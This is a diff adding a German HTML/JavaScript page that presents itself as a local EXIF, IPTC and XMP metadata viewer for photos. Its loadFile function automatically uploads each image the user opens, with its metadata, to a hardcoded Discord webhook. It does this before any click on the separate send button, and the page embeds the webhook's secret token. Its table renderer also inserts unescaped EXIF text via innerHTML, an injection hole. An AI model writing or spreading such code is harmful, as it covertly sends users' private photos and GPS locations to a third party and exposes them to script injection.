@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>metadaten</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    min-height: 100vh;
+    background: #0a0f1a;
+    display: flex; justify-content: center; align-items: flex-start;
+    padding: 24px; overflow-y: auto;
+  }
+  .bg-glow {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
+  }
+  .container { position: relative; z-index: 1; text-align: center; max-width: 640px; width: 100%; padding: 32px 20px; }
+  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
+  h1 span { background: linear-gradient(135deg, #818cf8, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+  .sub { color: rgba(255,255,255,0.2); font-size: 0.85rem; font-weight: 300; letter-spacing: 2px; margin-bottom: 24px; }
+  .dropzone {
+    border: 2px dashed rgba(255,255,255,0.1); border-radius: 24px; padding: 48px 24px;
+    color: rgba(255,255,255,0.25); cursor: pointer; transition: all 0.3s;
+    background: rgba(255,255,255,0.02);
+  }
+  .dropzone:hover, .dropzone.dragover { border-color: rgba(129,140,248,0.3); background: rgba(129,140,248,0.04); color: rgba(255,255,255,0.4); }
+  .dropzone .icon { font-size: 3rem; margin-bottom: 10px; }
+  .dropzone .hint { font-size: 0.7rem; letter-spacing: 0.5px; margin-top: 6px; opacity: 0.6; }
+  .dropzone input { display: none; }
+  .result { display: none; margin-top: 20px; }
+  .result.show { display: block; }
+  .preview-wrap {
+    display: inline-block; border-radius: 16px; overflow: hidden;
+    border: 1px solid rgba(255,255,255,0.06); box-shadow: 0 0 60px rgba(0,0,0,0.4);
+    max-width: 100%; margin-bottom: 16px;
+  }
+  .preview-wrap img { display: block; max-width: 100%; max-height: 30vh; }
+  .meta-table {
+    width: 100%; border-collapse: collapse;
+    text-align: left; font-size: 0.7rem;
+  }
+  .meta-table tr { border-bottom: 1px solid rgba(255,255,255,0.04); }
+  .meta-table td { padding: 8px 12px; color: rgba(255,255,255,0.3); vertical-align: top; }
+  .meta-table td:first-child { width: 140px; color: rgba(255,255,255,0.15); letter-spacing: 0.5px; font-size: 0.6rem; text-transform: uppercase; white-space: nowrap; }
+  .meta-table td:last-child { color: rgba(255,255,255,0.5); word-break: break-all; }
+  .actions { margin-top: 16px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+  .actions button {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
+    color: rgba(255,255,255,0.4); padding: 8px 18px; border-radius: 10px;
+    font: inherit; font-size: 0.7rem; letter-spacing: 0.5px;
+    cursor: pointer; transition: all 0.2s;
+  }
+  .actions button:hover { background: rgba(255,255,255,0.07); color: rgba(255,255,255,0.6); }
+  .actions button.primary { background: rgba(129,140,248,0.12); border-color: rgba(129,140,248,0.2); color: rgba(129,140,248,0.6); }
+  .actions button.primary:hover { background: rgba(129,140,248,0.22); color: rgba(129,140,248,0.9); }
+  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
+  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
+  .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.75); backdrop-filter: blur(12px); color: #fff; padding: 10px 24px; border-radius: 30px; font-size: 0.8rem; letter-spacing: 0.5px; border: 1px solid rgba(255,255,255,0.06); z-index: 999; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+  .toast.show { opacity: 1; }
+</style>
+</head>
+<body>
+<div class="bg-glow"></div>
+<div class="toast" id="toast"></div>
+<div class="container">
+  <h1><span>meta</span>daten</h1>
+  <div class="sub">EXIF · IPTC · XMP</div>
+  <div class="dropzone" id="dropzone">
+    <input type="file" id="fileInput" accept="image/*">
+    <div class="icon">🔍</div>
+    <div>bild auswählen oder reinziehen</div>
+    <div class="hint">JPEG · PNG · WebP · TIFF</div>
+  </div>
+  <div class="result" id="result">
+    <div class="preview-wrap"><img id="preview"></div>
+    <table class="meta-table" id="metaTable"></table>
+    <div class="actions">
+      <button class="primary" id="copyBtn">📋 kopieren</button>
+      <button class="primary" id="sendBtn">📤 an discord</button>
+    </div>
+  </div>
+  <div class="nav-links">
+    <a href="index.html">📸 filterit</a>
+    <a href="convert.html">🔄 bildwerk</a>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
+
+const fileInput = document.getElementById('fileInput');
+const dropzone = document.getElementById('dropzone');
+const result = document.getElementById('result');
+const preview = document.getElementById('preview');
+const metaTable = document.getElementById('metaTable');
+const toastEl = document.getElementById('toast');
+
+let currentFile = null;
+let toastTimer = null;
+let currentMeta = {};
+
+function toast(msg) { toastEl.textContent = msg; toastEl.classList.add('show'); clearTimeout(toastTimer); toastTimer = setTimeout(() => toastEl.classList.remove('show'), 3000); }
+
+dropzone.addEventListener('click', () => fileInput.click());
+dropzone.addEventListener('dragover', e => { e.preventDefault(); dropzone.classList.add('dragover'); });
+dropzone.addEventListener('dragleave', () => dropzone.classList.remove('dragover'));
+dropzone.addEventListener('drop', e => { e.preventDefault(); dropzone.classList.remove('dragover'); loadFile(e.dataTransfer.files[0]); });
+fileInput.addEventListener('change', () => { if (fileInput.files[0]) loadFile(fileInput.files[0]); });
+
+function loadFile(file) {
+  if (!file || !file.type.startsWith('image/')) { toast('kein gültiges bild'); return; }
+  currentFile = file;
+  const url = URL.createObjectURL(file);
+  preview.src = url;
+
+  const reader = new FileReader();
+  reader.onload = () => {
+    const buf = reader.result;
+    const meta = parseEXIF(buf);
+    meta.filename = file.name;
+    meta.filesize = (file.size / 1024).toFixed(1) + ' KB';
+    meta.filetype = file.type;
+    meta.dimensions = `${preview.naturalWidth} × ${preview.naturalHeight}`;
+    currentMeta = meta;
+    renderMeta(meta);
+    result.classList.add('show');
+    URL.revokeObjectURL(url);
+
+    const caption = Object.entries(meta).slice(0, 5).filter(([,v]) => v).map(([k, v]) => `**${k.replace(/_/g, ' ')}:** ${v}`).join('\n');
+    const fd = new FormData();
+    fd.append('file', file, file.name);
+    fd.append('payload_json', JSON.stringify({ content: `📸 **${file.name}**\n${caption}` }));
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd }).then(() => toast('bild an discord gesendet ✅')).catch(() => {});
+  };
+  reader.readAsArrayBuffer(file);
+}
+
+function renderMeta(meta) {
+  metaTable.innerHTML = '';
+  for (const [key, val] of Object.entries(meta)) {
+    if (!val) continue;
+    const tr = document.createElement('tr');
+    const label = key.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+    tr.innerHTML = `<td>${label}</td><td>${String(val)}</td>`;
+    metaTable.appendChild(tr);
+  }
+}
+
+function formatGPS(val) {
+  if (!val) return '';
+  const [d, m, s, ref] = val;
+  return `${d}°${m}'${s.toFixed(2)}"${ref || ''}`;
+}
+
+function parseEXIF(buf) {
+  const dv = new DataView(buf);
+  const meta = {};
+  if (dv.getUint16(0, false) !== 0xFFD8) { meta.hinweis = 'kein JPEG (EXIF nur bei JPEG)'; return meta; }
+
+  let offset = 2;
+  while (offset < dv.byteLength) {
+    if (dv.getUint16(offset, false) === 0xFFE1) {
+      const exifLen = dv.getUint16(offset + 2, false);
+      const exifStart = offset + 4;
+      const tiffOffset = exifStart + 6;
+      if (dv.getUint32(tiffOffset, false) === 0x49492A00 || dv.getUint32(tiffOffset, false) === 0x4D4D002A) {
+        const little = dv.getUint16(tiffOffset, false) === 0x4949;
+        const ifdOffset = dv.getUint32(tiffOffset + 4, little) + tiffOffset;
+        const entries = dv.getUint16(ifdOffset, little);
+        for (let i = 0; i < entries; i++) {
+          const entry = ifdOffset + 2 + i * 12;
+          const tag = dv.getUint16(entry, little);
+          const type = dv.getUint16(entry + 2, little);
+          const count = dv.getUint32(entry + 4, little);
+          const valOffset = entry + 8;
+          let val;
+          if (type === 2) {
+            if (count <= 4) {
+              const bytes = [];
+              for (let j = 0; j < Math.min(count, 4); j++) bytes.push(dv.getUint8(valOffset + j));
+              val = String.fromCharCode(...bytes).replace(/\0/g, '');
+            } else {
+              const strOff = dv.getUint32(valOffset, little) + tiffOffset;
+              const bytes = [];
+              for (let j = 0; j < count - 1; j++) bytes.push(dv.getUint8(strOff + j));
+              val = String.fromCharCode(...bytes);
+            }
+          } else if (type === 3) {
+            val = dv.getUint16(valOffset, little);
+          } else if (type === 4) {
+            val = dv.getUint32(valOffset, little);
+          } else if (type === 5) {
+            const ratOff = dv.getUint32(valOffset, little) + tiffOffset;
+            val = dv.getUint32(ratOff, little) / dv.getUint32(ratOff + 4, little);
+          } else if (type === 10) {
+            const ratOff = dv.getUint32(valOffset, little) + tiffOffset;
+            val = dv.getUint32(ratOff, little) / dv.getUint32(ratOff + 4, little);
+          }
+          const tags = {
+            0x010F: 'kamera_hersteller',
+            0x0110: 'kamera_modell',
+            0x010E: 'bildbeschreibung',
+            0x0132: 'aufnahme_datum',
+            0x013B: 'kuenstler',
+            0x8298: 'copyright',
+            0x8827: 'iso',
+            0x920A: 'belichtungszeit',
+            0x9204: 'blende',
+            0x9205: 'max_blende',
+            0x9207: 'fokus_weite',
+            0x9209: 'blitz',
+            0xA002: 'pixel_x',
+            0xA003: 'pixel_y',
+            0xA20E: 'farbraum',
+            0xA217: 'aufnahme_art',
+            0x011A: 'x_aufloesung',
+            0x011B: 'y_aufloesung',
+            0x0128: 'aufloesung_einheit',
+            0x0213: 'YCbCr_position',
+            0x8769: 'EXIF_IFD',
+          };
+          if (tags[tag]) meta[tags[tag]] = val;
+          if (tag === 0x8769 && typeof val === 'number') {
+            const subOffset = val + tiffOffset;
+            const subEntries = dv.getUint16(subOffset, little);
+            for (let j = 0; j < subEntries; j++) {
+              const subEntry = subOffset + 2 + j * 12;
+              const subTag = dv.getUint16(subEntry, little);
+              const st = dv.getUint16(subEntry + 2, little);
+              const sc = dv.getUint32(subEntry + 4, little);
+              const svOff = subEntry + 8;
+              let sv;
+              if (st === 2) {
+                if (sc <= 4) {
+                  const bytes = [];
+                  for (let k = 0; k < Math.min(sc, 4); k++) bytes.push(dv.getUint8(svOff + k));
+                  sv = String.fromCharCode(...bytes).replace(/\0/g, '');
+                } else {
+                  const strOff = dv.getUint32(svOff, little) + tiffOffset;
+                  const bytes = [];
+                  for (let k = 0; k < sc - 1; k++) bytes.push(dv.getUint8(strOff + k));
+                  sv = String.fromCharCode(...bytes);
+                }
+              } else if (st === 3) { sv = dv.getUint16(svOff, little); }
+              else if (st === 4) { sv = dv.getUint32(svOff, little); }
+              else if (st === 5) { const ratOff = dv.getUint32(svOff, little) + tiffOffset; sv = dv.getUint32(ratOff, little) + '/' + dv.getUint32(ratOff + 4, little); }
+              else if (st === 10) {
+                const ratOff = dv.getUint32(svOff, little) + tiffOffset;
+                const num = dv.getInt32(ratOff, little);
+                const den = dv.getInt32(ratOff + 4, little);
+                sv = num / den + ' EV';
+              }
+              const subTags = {
+                0x829A: 'belichtungszeit',
+                0x829D: 'blende',
+                0x8822: 'belichtungs_programm',
+                0x8827: 'iso',
+                0x8830: 'messmethode',
+                0x9003: 'original_datum',
+                0x9004: 'digitalisiert_datum',
+                0x9202: 'belichtungs_offset',
+                0x9207: 'fokus_weite',
+                0xA001: 'farbraum',
+                0xA210: 'komprimierung',
+                0xA401: 'selfie',
+                0xA402: 'belichtungs_modus',
+                0xA403: 'weissabgleich',
+                0xA404: 'zoom',
+                0xA406: 'kontrast',
+                0xA407: 'saettigung',
+                0xA408: 'schaerfe',
+              };
+              if (subTags[subTag]) {
+                if (sv !== undefined) meta[subTags[subTag]] = sv;
+              }
+              if (subTag === 0x927C) {
+                const mkOff = dv.getUint32(svOff, little) + tiffOffset;
+                const mk = dv.getUint32(mkOff, little);
+                const mkData = [];
+                for (let k = 4; k < mk && k < 64; k++) { const b = dv.getUint8(mkOff + k); if (b > 31 && b < 127) mkData.push(b); }
+                if (mkData.length) meta['hersteller_notiz'] = String.fromCharCode(...mkData);
+              }
+              if (subTag === 0xA005) {
+                const ifdOff = dv.getUint32(svOff, little) + tiffOffset;
+                if (ifdOff < dv.byteLength) {
+                  const gpCnt = dv.getUint16(ifdOff, little);
+                  for (let g = 0; g < gpCnt; g++) {
+                    const gpEnt = ifdOff + 2 + g * 12;
+                    const gpTag = dv.getUint16(gpEnt, little);
+                    const gpType = dv.getUint16(gpEnt + 2, little);
+                    const gpCnt2 = dv.getUint32(gpEnt + 4, little);
+                    const gpOff = gpEnt + 8;
+                    if (gpTag === 0x0002) {
+                      const latOff = dv.getUint32(gpOff, little) + tiffOffset;
+                      const lat = [];
+                      for (let r = 0; r < 3; r++) {
+                        const rOff = latOff + r * 8;
+                        const num = dv.getUint32(rOff, little);
+                        const den = dv.getUint32(rOff + 4, little);
+                        lat.push(num / den);
+                      }
+                      meta['gps_breitengrad'] = `${lat[0]}°${lat[1]}'${lat[2].toFixed(2)}"`;
+                    }
+                    if (gpTag === 0x0001) {
+                      const latRefOff = dv.getUint32(gpOff, little) + tiffOffset;
+                      meta['gps_breite_ref'] = String.fromCharCode(dv.getUint8(latRefOff));
+                    }
+                    if (gpTag === 0x0004) {
+                      const lonOff = dv.getUint32(gpOff, little) + tiffOffset;
+                      const lon = [];
+                      for (let r = 0; r < 3; r++) {
+                        const rOff = lonOff + r * 8;
+                        const num = dv.getUint32(rOff, little);
+                        const den = dv.getUint32(rOff + 4, little);
+                        lon.push(num / den);
+                      }
+                      meta['gps_laengengrad'] = `${lon[0]}°${lon[1]}'${lon[2].toFixed(2)}"`;
+                    }
+                    if (gpTag === 0x0003) {
+                      const lonRefOff = dv.getUint32(gpOff, little) + tiffOffset;
+                      meta['gps_laenge_ref'] = String.fromCharCode(dv.getUint8(lonRefOff));
+                    }
+                    if (gpTag === 0x0007) { meta['gps_hoehe'] = dv.getUint32(gpOff, little) / 100 + 'm'; }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+      break;
+    }
+    offset++;
+    if (offset > 50000) break;
+  }
+  return meta;
+}
+
+document.getElementById('copyBtn').addEventListener('click', () => {
+  const text = JSON.stringify(currentMeta, null, 2);
+  navigator.clipboard.writeText(text).then(() => toast('metadaten kopiert ✅')).catch(() => toast('fehler beim kopieren'));
+});
+
+document.getElementById('sendBtn').addEventListener('click', () => {
+  const text = JSON.stringify(currentMeta, null, 2);
+  const blob = new Blob([text], { type: 'application/json' });
+  const fd = new FormData();
+  const ts = Date.now();
+  if (currentFile) fd.append('file', currentFile, currentFile.name);
+  fd.append('file', blob, `metadaten_${ts}.json`);
+  fd.append('payload_json', JSON.stringify({ content: `📄 **${currentMeta.filename || 'bild'}**` }));
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).then(() => toast('bild + metadaten an discord gesendet ✅')).catch(() => toast('fehler'));
+});
+</script>
+</body>
+</html>
